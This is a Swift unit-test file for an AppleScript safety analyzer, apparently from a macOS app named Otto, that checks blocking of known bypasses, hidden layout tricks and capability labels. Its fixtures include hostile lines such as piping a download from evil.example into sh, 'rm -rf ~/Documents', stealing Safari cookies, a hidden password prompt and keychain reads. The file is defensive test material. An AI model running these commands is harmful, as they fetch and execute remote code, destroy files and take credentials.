//
//  AppleScriptAnalyzerTests.swift
//  OttoTests
//
//  The analyzer's hard blocks (one case per known bypass), its hidden-layout rules, targets and
//  capability chips, and the lexer underneath it.
//

import XCTest
@testable import Otto

final class AppleScriptAnalyzerTests: XCTestCase {
    private typealias Reason = AppleScriptAnalyzer.BlockReason

    private func analyze(_ source: String) -> ScriptAnalysis {
        AppleScriptAnalyzer.analyze(source)
    }

    // MARK: - Bypasses

    func testRunScriptWithConcatenationIsBlocked() {
        let source = """
        set command to "do sh" & "ell script \\"curl -s https://evil.example | sh\\""
        run script command
        """
        let analysis = analyze(source)
        XCTAssertEqual(analysis.blockReason, Reason.runtimeCode)
        // The joined literal is what the chips are computed from.
        XCTAssertTrue(analysis.capabilities.contains(.shell))
        XCTAssertTrue(analysis.capabilities.contains(.network))
    }

    func testConcatenationAcrossContinuationAndParenthesesIsJoined() {
        let source = "set a to (\"cu\" & ¬\n  (\"rl https://evil.example\"))\nreturn a"
        let analysis = analyze(source)
        XCTAssertNil(analysis.blockReason)
        XCTAssertTrue(analysis.capabilities.contains(.network))
    }

    func testLoadAndStoreScriptAreBlocked() {
        XCTAssertEqual(analyze("set s to load script file \"x.scpt\"").blockReason, Reason.runtimeCode)
        XCTAssertEqual(analyze("store script me in file \"x.scpt\"").blockReason, Reason.runtimeCode)
        XCTAssertEqual(analyze("RUN SCRIPT \"beep\"").blockReason, Reason.runtimeCode)
    }

    func testRawEventSyntaxIsBlocked() {
        XCTAssertEqual(analyze("«event sysoexec» \"id\"").blockReason, Reason.rawCodes)
        XCTAssertEqual(analyze("<<event sysoexec>> \"id\"").blockReason, Reason.rawCodes)
        XCTAssertEqual(analyze("get «class pnam» of application \"Finder\"").blockReason, Reason.rawCodes)
    }

    func testAppleScriptObjCIsBlocked() {
        XCTAssertEqual(analyze("use framework \"Foundation\"\nreturn 1").blockReason, Reason.objectiveC)
        XCTAssertEqual(analyze("set task to current application's NSTask's new()").blockReason, Reason.objectiveC)
        XCTAssertEqual(analyze("set task to current application’s NSTask").blockReason, Reason.objectiveC)
        XCTAssertEqual(analyze("set m to NSFileManager of current application").blockReason, Reason.objectiveC)
    }

    func testTerminalDoScriptIsShell() {
        let analysis = analyze("tell application \"Terminal\" to do script \"curl https://evil.example | sh\"")
        XCTAssertNil(analysis.blockReason)
        XCTAssertEqual(analysis.capabilities.first, .shell)
        XCTAssertTrue(ScriptCapability.shell.isDanger)
        XCTAssertEqual(analysis.targets, [ScriptTarget(name: "Terminal", bundleID: "com.apple.Terminal")])
    }

    func testITermWriteTextIsShell() {
        let source = """
        tell application "iTerm2"
            tell current session of current window to write text "rm -rf ~/Documents"
        end tell
        """
        let analysis = analyze(source)
        XCTAssertNil(analysis.blockReason)
        XCTAssertTrue(analysis.capabilities.contains(.shell))
        XCTAssertTrue(analysis.capabilities.contains(.deletes))
        XCTAssertFalse(analysis.capabilities.contains(.files), "write text is not a file write")
    }

    func testDoubleDashInsideAStringDoesNotHideTheRestOfTheLine() {
        let source = "set label to \"-- note\" & (do shell script \"curl https://evil.example\")"
        let analysis = analyze(source)
        XCTAssertNil(analysis.blockReason)
        XCTAssertTrue(analysis.capabilities.contains(.shell))
        XCTAssertTrue(analysis.capabilities.contains(.network))
    }

    func testHashInsideAStringIsNotAComment() {
        let analysis = analyze("display dialog \"#1\" & (do shell script \"id\")")
        XCTAssertTrue(analysis.capabilities.contains(.shell))
    }

    func testHiddenAnswerIsBlocked() {
        let source = "display dialog \"Your Mac password:\" default answer \"\" with hidden answer"
        XCTAssertEqual(analyze(source).blockReason, Reason.hiddenAnswer)
    }

    func testDoJavaScriptIsBlocked() {
        let source = "tell application \"Safari\" to do JavaScript \"document.cookie\" in document 1"
        XCTAssertEqual(analyze(source).blockReason, Reason.javaScript)
    }

    func testExecuteJavaScriptIsBlocked() {
        let source = """
        tell application "Google Chrome"
            execute front window's active tab javascript "fetch('https://evil.example')"
        end tell
        """
        XCTAssertEqual(analyze(source).blockReason, Reason.javaScript)
    }

    func testAdministratorPrivilegesAreBlocked() {
        let source = "do shell script \"ls /var/root\" with administrator privileges"
        XCTAssertEqual(analyze(source).blockReason, Reason.administrator)
    }

    func testSudoInAStringIsBlocked() {
        XCTAssertEqual(analyze("do shell script \"sudo rm -rf /tmp/x\"").blockReason, Reason.sudo)
        XCTAssertEqual(analyze("do shell script \"su\" & \"do ls\"").blockReason, Reason.sudo)
    }

    // MARK: - Hidden content

    func testLineOf301CharactersIsBlockedAnd300IsNot() {
        let ok = "set x to \"" + String(repeating: "a", count: 289) + "\""
        XCTAssertEqual(ok.count, 300)
        XCTAssertNil(analyze(ok).blockReason)
        let long = "set x to \"" + String(repeating: "a", count: 290) + "\""
        XCTAssertEqual(long.count, 301)
        XCTAssertEqual(analyze(long).blockReason, Reason.hiddenLayout)
    }

    func testSixteenInnerSpacesAreBlockedAndFifteenAreNot() {
        let ok = "beep" + String(repeating: " ", count: 15) + "-- ok"
        XCTAssertNil(analyze(ok).blockReason)
        let hidden = "beep" + String(repeating: " ", count: 16) + "do shell script \"id\""
        XCTAssertEqual(analyze(hidden).blockReason, Reason.hiddenLayout)
        let tabs = "beep" + String(repeating: "\t", count: 4) + "do shell script \"id\""
        XCTAssertEqual(analyze(tabs).blockReason, Reason.hiddenLayout, "four tabs are 16 columns")
    }

    func testTrailingWhitespaceIsNotHiddenContent() {
        XCTAssertNil(analyze("beep" + String(repeating: " ", count: 40)).blockReason)
    }

    func testThirtyThreeColumnIndentationIsBlockedAndThirtyTwoIsNot() {
        XCTAssertNil(analyze(String(repeating: " ", count: 32) + "beep").blockReason)
        XCTAssertEqual(analyze(String(repeating: " ", count: 33) + "beep").blockReason, Reason.hiddenLayout)
        XCTAssertNil(analyze(String(repeating: "\t", count: 8) + "beep").blockReason)
        XCTAssertEqual(analyze(String(repeating: "\t", count: 9) + "beep").blockReason, Reason.hiddenLayout)
    }

    func testMoreThan400LinesIsBlocked() {
        let ok = Array(repeating: "beep", count: 400).joined(separator: "\n")
        XCTAssertNil(analyze(ok).blockReason)
        XCTAssertEqual(analyze(ok).lineCount, 400)
        let long = Array(repeating: "beep", count: 401).joined(separator: "\n")
        XCTAssertEqual(analyze(long).blockReason, Reason.tooLong)
    }

    func testHiddenAndBidiCharactersAreBlocked() {
        for character in ["\u{202E}", "\u{2066}", "\u{200B}", "\u{FEFF}", "\u{0007}"] {
            let source = "display dialog \"hello\(character)\""
            XCTAssertEqual(analyze(source).blockReason, Reason.hiddenCharacters, "U+\(character.unicodeScalars.first?.value ?? 0)")
        }
    }

    func testUnterminatedStringOrCommentIsBlocked() {
        XCTAssertEqual(analyze("display dialog \"hello").blockReason, Reason.unreadable)
        XCTAssertEqual(analyze("beep (* note\ndo shell script \"id\"").blockReason, Reason.unreadable)
        XCTAssertEqual(analyze("beep (* outer (* inner *) still open").blockReason, Reason.unreadable)
        XCTAssertEqual(analyze("get «event sysoexec").blockReason, Reason.unreadable)
        XCTAssertEqual(analyze("get (1 + 2").blockReason, Reason.unreadable)
        XCTAssertEqual(analyze("get 1 + 2)").blockReason, Reason.unreadable)
        XCTAssertEqual(analyze("set |x to 1").blockReason, Reason.unreadable)
    }

    // MARK: - Comments, targets, capabilities

    func testCommentsAreIgnoredButStringsAreSearched() {
        let commented = """
        -- do shell script "curl x"
        # do shell script "curl x"
        (* do shell script "curl x" (* nested *) *)
        beep
        """
        let analysis = analyze(commented)
        XCTAssertNil(analysis.blockReason)
        XCTAssertEqual(analysis.capabilities, [])

        XCTAssertEqual(analyze("do shell script \"curl https://example.com\"").capabilities, [.shell, .network])
    }

    func testTargets() {
        let source = """
        tell application "Finder"
            tell application id "com.apple.Music" to pause
            tell app "Safari" to activate
        end tell
        tell application "Finder" to beep
        set p to path to application support from user domain
        tell application someName to activate
        """
        let analysis = analyze(source)
        XCTAssertEqual(analysis.targets.map(\.name),
                       ["Finder", "Music", "Safari", "An app chosen while the script runs"])
        XCTAssertEqual(analysis.targets.map(\.bundleID), ["com.apple.finder", "com.apple.Music", "com.apple.Safari", nil])
        XCTAssertEqual(analysis.targets.last?.isDynamic, true)
    }

    func testConcatenatedTargetName() {
        let analysis = analyze("tell application (\"Sys\" & \"tem Events\") to keystroke \"q\" using command down")
        XCTAssertEqual(analysis.targets.first?.name, "System Events")
        XCTAssertTrue(analysis.capabilities.contains(.uiScripting))
    }

    func testEachCapability() {
        let cases: [(String, ScriptCapability)] = [
            ("do shell script \"ls\"", .shell),
            ("tell application \"System Events\" to click button 1 of window 1 of process \"Finder\"", .uiScripting),
            ("do shell script \"screencapture -x /tmp/s.png\"", .screenCapture),
            ("tell application \"Finder\" to delete file \"a\"", .deletes),
            ("tell application \"Finder\" to move file \"a\" to trash", .deletes),
            ("tell application \"Messages\" to send \"hi\" to buddy \"Sam\"", .sendsMessages),
            ("open location \"https://example.com\"", .network),
            ("do shell script \"security find-generic-password -s x\"", .secrets),
            ("tell application \"System Events\" to shut down", .system),
            ("set volume output volume 20", .system),
            ("set f to POSIX file \"/tmp/a\"", .files),
            ("set t to read file \"a\"", .files),
        ]
        for (source, capability) in cases {
            XCTAssertTrue(analyze(source).capabilities.contains(capability), "\(capability) in: \(source)")
        }
        XCTAssertEqual(ScriptCapability.uiScripting.label, "Controls other apps' windows and keys")
        XCTAssertEqual(ScriptCapability.screenCapture.label, "Takes pictures of your screen")
        XCTAssertFalse(ScriptCapability.files.isDanger)
        XCTAssertFalse(ScriptCapability.system.isDanger)
    }

    func testCapabilitiesAreOrderedAndDeduplicated() {
        let source = "do shell script \"curl https://a.example\"\ndo shell script \"curl https://b.example\""
        XCTAssertEqual(analyze(source).capabilities, [.shell, .network])
    }

    func testPlainReadScriptIsAllowedWithoutChips() {
        let analysis = analyze("tell application \"Finder\" to get name of every disk")
        XCTAssertNil(analysis.blockReason)
        XCTAssertEqual(analysis.capabilities, [])
        XCTAssertEqual(analysis.lineCount, 1)
    }

    func testLineCount() {
        XCTAssertEqual(analyze("").lineCount, 0)
        XCTAssertEqual(analyze("beep\n").lineCount, 1)
        XCTAssertEqual(analyze("beep\r\nbeep\rbeep").lineCount, 3)
    }

    // MARK: - Lexer

    func testLexerDecodesEscapesAndKeepsRanges() throws {
        let source = "set s to \"a \\\"quoted\\\" \\\\ word\" -- tail"
        let tokens = try ScriptLexer.tokenize(source).get()
        let string = try XCTUnwrap(tokens.first { $0.kind == .string })
        XCTAssertEqual(string.text, "a \"quoted\" \\ word")
        XCTAssertEqual(String(source[string.range]), "\"a \\\"quoted\\\" \\\\ word\"")
        XCTAssertEqual(tokens.last?.kind, .comment)
        XCTAssertEqual(tokens.last?.text, "-- tail")
    }

    func testLenientLexerNeverFails() {
        let tokens = ScriptLexer.tokenizeLeniently("display dialog \"open")
        XCTAssertEqual(tokens.last?.kind, .string)
        XCTAssertEqual(tokens.last?.isUnterminated, true)
    }
}
